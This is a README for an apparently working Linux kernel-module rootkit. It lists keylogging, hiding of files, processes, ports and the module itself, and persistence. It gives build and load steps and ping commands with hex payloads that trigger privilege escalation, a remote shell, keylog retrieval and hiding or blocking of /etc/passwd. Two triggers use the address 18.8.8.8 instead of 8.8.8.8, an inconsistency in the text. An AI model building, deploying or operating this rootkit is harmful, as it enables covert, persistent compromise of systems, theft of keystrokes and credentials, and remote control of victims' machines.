# Description

Kprobe-based LKM rootkit.

# Features

● ICMP communication
● Userland agent
● Keylogger
● File hide
● PID hide
● Port hide
● LKM hide
● LKM Persistence
● Debug

# Build

## First step

Change KRN_SRC from Makefile to your kernel source directory

```bash
change ccflags-y := -I<abosulte_path_of_project>/include from src/Kbuild
change ccflags-y := -I<abosulte_path_of_project>/include/utils from src/Kbuild
change ccflags-y := -I<abosulte_path_of_project>/include/implant from src/Kbuild
change ccflags-y := -I<abosulte_path_of_project>/include/stealth from src/Kbuild
```

## Compile LKM

make

## Clean LKM

make clean

## Create release

make dist

## Clean release

make distclean

# Usage

## Load kernel Module

sudo /init_network
sudo insmod main.ko
sudo depmod

## Interact

```ping -p <code> -c 1 8.8.8.8```

### Elevate process privilege

```ping -p ca550100000000000000000000000000 -c 1 8.8.8.8```

### Launch a remote shell

```ping -p ff -c 1 8.8.8.8```

### Get a keylogger records

```ping -p ba -c 1 8.8.8.8```

### Hide process

```ping -p de550100000000000000000000000000 -c 1 8.8.8.8```

### Hide passwd file

```ping -p ad017061737377640000000000000000 -c 1 8.8.8.8```

### Restore

```ping -p ad007061737377640000000000000000 -c 1 8.8.8.8```

### Unable to open /etc/passwd

```ping -p fe012f6574632f706173737764000000 -c 1 18.8.8.8```

### Restore

```ping -p fe002f6574632f706173737764000000 -c 1 18.8.8.8```

# Authors

* [p2lu](https://github.com/p2lu): ICMP communication.
* [exhyl](https://github.com/hnopew): Keylogger, test and repository project.
* [MikeHorn-git](https://github.com/MikeHorn-git): Hide and persistence.
